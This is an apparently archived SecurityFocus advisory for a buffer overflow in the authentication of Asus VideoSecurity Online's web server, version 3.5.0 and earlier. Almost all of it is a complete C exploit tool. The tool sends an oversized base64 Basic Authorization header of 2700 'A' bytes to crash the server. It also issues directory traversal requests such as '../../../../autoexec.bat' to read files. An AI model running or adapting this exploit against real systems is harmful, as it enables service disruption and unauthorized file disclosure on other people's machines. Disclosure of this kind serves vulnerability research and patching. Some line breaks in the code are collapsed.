source: http://www.securityfocus.com/bid/15279/info

Asus VideoSecurity Online is prone to a buffer overflow in the authentication mechanism of the included Web server. This issue only exists if authentication is enabled on the Web server.

The Web server included with Asus VideoSecurity Online is not enabled by default.

This vulnerability is reported to affect Asus VideoSecurity Online 3.5.0 and earlier. 

/* by Luigi Auriemma */ #include <stdio.h> #include <stdlib.h> #include
<string.h> #ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"
    #define close closesocket
    #define ONESEC 1000 #else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
    #define ONESEC 1 #endif #define VER "0.1" #define PORT 80 #define
BUFFSZ 8192 #define BOFSZ 2700 u_char *delimit(u_char *data); int
http_get(u_char *in, int insz, u_char *out, int outsz); u_char
*base64_encode(u_char *data, int *length); u_int resolv(char *host); void
std_err(void); struct sockaddr_in peer; int main(int argc, char *argv[]) {
    int len,
            attack,
            auth = 0;
    u_short port = PORT;
    u_char buff[BUFFSZ],
            uri[BUFFSZ >> 1],
            more[BUFFSZ >> 1],
            userpass[64],
            *b64,
            *p; #ifdef WIN32
    WSADATA wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata); #endif
    setbuf(stdout, NULL);
    fputs("\n"
        "ASUS Video Security <= 3.5.0.0 HTTP multiple vulnerabilities
"VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:  http://aluigi.altervista.org\n"
        "\n", stdout);
    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> [port(%hu)]\n"
            "\n"
            "Attack:\n"
            "1 = authorization buffer-overflow, works only if server uses
password\n"
            "2 = directory traversal, if the server uses a password you
must know it\n"
            "\n", argv[0], port);
        exit(1);
    }
    attack = atoi(argv[1]);
    if(argc > 3) port = atoi(argv[3]);
    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port = htons(port);
    peer.sin_family = AF_INET;
    printf("- target %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);
    len = sprintf(buff,
        "GET / HTTP/1.1\r\n"
        "Connection: close\r\n"
        "\r\n");
    fputs("- check server\n", stdout);
    len = http_get(buff, len, buff, sizeof(buff) - 1);
    p = strstr(buff, "\r\n\r\n");
    if(p) *p = 0;
    if(strstr(buff, "Authenticate")) {
        auth = 1;
        fputs("- server uses password\n", stdout);
    }
    *uri = 0;
    *more = 0;
    switch(attack) {
        case 1: {
            if(!auth) {
                printf("  Alert: the server doesn't use password so is not
vulnerable to this attack\n");
            }
            memset(buff, 'A', BOFSZ);
            len = BOFSZ;
            b64 = base64_encode(buff, &len);
            sprintf(more, "Authorization: Basic %s\r\n", b64);
            free(b64);
            } break;
        case 2: {
            if(auth) {
                fputs("- insert username:password (like asus:asus):\n ",
stdout);
                fflush(stdin);
                fgets(userpass, sizeof(userpass), stdin);
                len = delimit(userpass) - userpass;
                b64 = base64_encode(userpass, &len);
                sprintf(more, "Authorization: Basic %s\r\n", b64);
                free(b64);
            }
            fputs("- insert the URI (like ../../../../autoexec.bat):\n ",
stdout);
            fflush(stdin);
            fgets(uri, sizeof(uri), stdin);
            delimit(uri);
            } break;
        default: {
            printf("\nError: the attack %d is not available\n\n", attack);
            exit(1);
            } break;
    }
    sleep(ONESEC);
    len = sprintf(buff,
        "GET /%s HTTP/1.1\r\n"
        "Connection: close\r\n"
        "%s"
        "\r\n",
        uri,
        more);
    fputs("- launch attack\n", stdout);
    len = http_get(buff, len, buff, sizeof(buff) - 1);
    if(len < 0) {
        fputs("- the server seems crashed\n\n", stdout);
    } else {
        fputs("- show the returned data:\n", stdout);
        fputs(buff, stdout);
    }
    return(0); } u_char *delimit(u_char *data) {
    while(*data > '\r') data++;
    *data = 0;
    return(data); } int http_get(u_char *in, int insz, u_char *out, int
outsz) {
    int sd,
            t,
            len = 0;
    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();
    if(send(sd, in, insz, 0)
      < 0) std_err();
    while(outsz) {
        t = recv(sd, out, outsz, 0);
        if(t < 0) {
            len = -1;
            break;
        }
        if(!t) break;
        len += t;
        out += t;
        outsz -= t;
    }
    *out = 0;
    close(sd);
    return(len); } u_char *base64_encode(u_char *data, int *length) {
    int r64len,
                    len = *length;
    u_char *p64;
    static u_char *r64;
    const static char enctab[64] = {
        'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P',
        'Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f',
        'g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v',
        'w','x','y','z','0','1','2','3','4','5','6','7','8','9','+','/'
    };
    r64len = ((len / 3) << 2) + 5;
    r64 = malloc(r64len);
    if(!r64) return(NULL);
    p64 = r64;
    do {
        *p64++ = enctab[(*data >> 2) & 63];
        *p64++ = enctab[(((*data & 3) << 4) | ((*(data + 1) >> 4) & 15)) &
63];
        data++;
        *p64++ = enctab[(((*data & 15) << 2) | ((*(data + 1) >> 6) & 3)) &
63];
        data++;
        *p64++ = enctab[*data & 63];
        data++;
        len -= 3;
    } while(len > 0);
    for(; len < 0; len++) *(p64 + len) = '=';
    *p64 = 0;
    *length = p64 - r64;
    return(r64); } u_int resolv(char *host) {
    struct hostent *hp;
    u_int host_ip;
    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolve hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_int *)(hp->h_addr);
    }
    return(host_ip); } #ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    } #endif